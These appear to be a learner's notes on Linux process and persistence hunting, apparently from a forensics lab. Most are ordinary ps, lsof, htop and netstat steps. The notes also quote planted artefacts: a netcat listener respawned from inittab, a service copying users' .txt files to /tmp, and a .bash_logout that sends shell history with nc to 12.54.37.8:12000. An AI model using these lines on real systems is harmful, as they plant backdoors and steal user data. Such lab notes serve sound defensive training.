
------------------------------------------
# Finding the parent process ID of the user logged in shell
```shell
ps -elf --forest
    #this will show the parent pcoress binaries that ran a program
```
-------------------------------------------
# find a daemon argument
```shell
ps -elf #identify if the "PROCESS NAME"d daemon is running
ps -elf --forest | grep "PROCESS NAME"d # grep out the "PROCESS NAME"d daemon
#With the below output you can see arguments sent to the "PROCESS NAME" daemon
CODE OUPUT;
5 S ssh       "pid"    1  0  80   0 - 23949 -      May04 ?        00:00:47 /usr/sbin/"PROCESS NAME"d -p /var/run/ssh.pid -g -u105:109
 0 S bombadil  4436  3956  0  80   0 -  3179 -      14:49 pts/0    00:00:00              \_ grep ssh
#looking at the end of the "PROCESS NAME"d you can see the given argument (-p /var/run/"PROCESS NAME"d.pid -g -u 105:109)
```
-------------------------------------------

# Identify the file mapped to the fourth file descriptor (handle) of the cron process.
```shell
#Look for FILE DESCRIPTORS
sudo lsof | Less #List-Open-Files(LSOF) 
sudo lsof | grep cron #lsof and grep out cron. look for fourth "FILE" descriptor
[lsof] /cron #this will search for the cron string. Then looking for the descriptor column
OUTPUT cron       1327            root    3u      REG               0,19        5      11513 /run/crond.pid
```   
-------------------------------------------
# find file permissions
```shell
sudo lsof | Less #view open files
[lsof] /cron #this will search for the cron string. Then looking for the descriptor column. answer is 3u
OUTPUT cron       1327            root    3u      REG               0,19        5      11513 /run/crond.pid
```
-------------------------------------------
# orphans processes on the SysV system.
```shell
htop #run htop to view currently running processes
f5 #this will show the tree for child processes
```
-------------------------------------------
# finding zombie processes
```shell
htop #look for process spawning zombie processes
    #zombie processes will show a "z"
```
-------------------------------------------
# find strange port
```shell
htop #run htop to view binaries being ran with additonal /binbash command/arguments
nestat -ano #also useful
```
-------------------------------------------
# find a process. find symbolic link to the absolute path for its EXECUTABLE

```shell
ps -elf | grep ssh #lists the current processes, grepping ssh
sudo find /proc/XXXX -type l -ls | grep ssh #This will look in the proc folder for links grepping ssh
#OUTPUT;
sudo find /proc/XXXX -type l -ls | grep ssh

 1---------      0 lrwxrwxrwx   1 root     root            0 May 16 15:02 /proc/XXXX/exe -> /usr/sbin/XXXX #This is the symbolic link of the executable to the ssh binary
```
---------------------------------------------
# find file using A UDP/TCP CONNECTION ON A PORT
```shell
netstat -ano # This will show your open sockets and established/listening lines
sudo lsof -i :xxx #this will search files open using socket 123
#OUTPUT;
sudo lsof -i :123
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
"PROCESS NAME"d    "pid" "PROCESS NAME"   16u  IPv6  11574      0t0  UDP *:"PROCESS NAME"
"PROCESS NAME"d    "pid" "PROCESS NAME"   17u  IPv4  11577      0t0  UDP *:"PROCESS NAME"
"PROCESS NAME"d    "pid" "PROCESS NAME"   18u  IPv4  11582      0t0  UDP localhost:"PROCESS NAME"
"PROCESS NAME"d    "pid" "PROCESS NAME"   19u  IPv4  11584      0t0  UDP 10.10.0.7:"PROCESS NAME" #here is the UDP connection information being stored w/PID "CHANGE PID"
"PROCESS NAME"d    "pid" "PROCESS NAME"   20u  IPv6  11586      0t0  UDP ip6-localhost:"PROCESS NAME"
"PROCESS NAME"d    "pid" "PROCESS NAME"   21u  IPv6  11588      0t0  UDP [fe80::f816:3eff:fede:a244]:"PROCESS NAME"

sudo lsof | grep "pid"| grep 10.10.0.7 #run lsof grepping a line w/PID and UDP information
sudo lsof | grep 10.10.0.7 | grep "CHANGE PID"
xxx      "pid"            "PROCESS NAME"   19u     IPv4              11584      0t0        UDP 10.10.0.7:xxx
#This is how you would see secuirty descriptor and permissions, the PROCESS NAME = "PROCESS NAME"d FILE = 19, PERM = u
```
---------------------------------------------  
# FIND STRANGE PORT AND PERSISTANCE
```shell
netstat -ano #identifiy strange port thats open
htop #use this to see parent process for suspect port listener
cat /etc/inittab #View the inittab boot confirguation file to find suspect persistance
#suspect output within inittab file

91:2345:respawn:/bin/netcat -lp xxxx #perisitance entry in startup file
```
---------------------------------------------

# FIND ZOMBIES SPAWNING STUFF
```powershell
htop
    f5 #open htop and to find zombie creator
    cp /home ~/Desktop;
    ls -l /home/ #cd into the directory
    cat  #view the cfor each and the ip its going to 
 ```
 ---------------------------------------------
# find file that creates zombie process
```shell
htop, then f5 # this will show tree
sudo lsof | grep "PID"" #get the pid and do an LSOF of the pid to get the files
    cat /opt/mysoul
```
---------------------------------------------
# determine theft of user logs
```shell
go into etc/systemd/system
find / -type f -exec grep -H '~/. IMPORTANTBASHFILE ' {} \;
sudo find / -type f -exec grep -H '.IMPORTANTBASHFILE' {} \;
# this command will look for a file that is tryign to look for a txt
#Look through the below folders with the command unitl you find the string

service running, check systemd
/bin/bash -c 'find /home -name \*.txt -exec cp {} /tmp \;,SERVICENAME.service
```
---------------------------------------------------
# find service stealing data
```shell
#After viewing the below informaiton you can determine the command is being ran with the persistance being the .timer
# go into /lib/systemd/system and LS services
#cat the services
```
-----------------------------------------------------
# find users losing credentials

```shell
cat /etc/passwd | grep -v nologin | grep -v false #view the /etc/passwd to view user with a /bin/false or "nologin. These users will not have an interactive login
sudo find / -name .IMPORTANTBASHFILE; #look for which users have a IMPORTANTBASHFILE file
#Output
garviel@terra:~$ sudo find / -name .IMPORTANTBASHFILE;
/home/garviel/.IMPORTANTBASHFILE
/tmp/.IMPORTANTBASHFILE
/root/.IMPORTANTBASHFILE
#being search other psrts of the drive for a string containsd the .IMPORTANTBASHFILE
/etc/apparmor.d/abstractions/bash:  @{HOME}/.IMPORTANTBASHFILE 
grep -r ".IMPORTANTBASHFILE" /lib     #System Libraries
/srv     #Service Data Directory began looking for direcotires containsing the bash file
#####
start looking in the .IMPORTANTBASHFILE files located in all users location
grep -r ".IMPORTANTBASHFILE" 

/tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2,IP:PORT

# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy
###Output
if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
/home/garviel/.bash_logout,12.54.37.8:12000



```


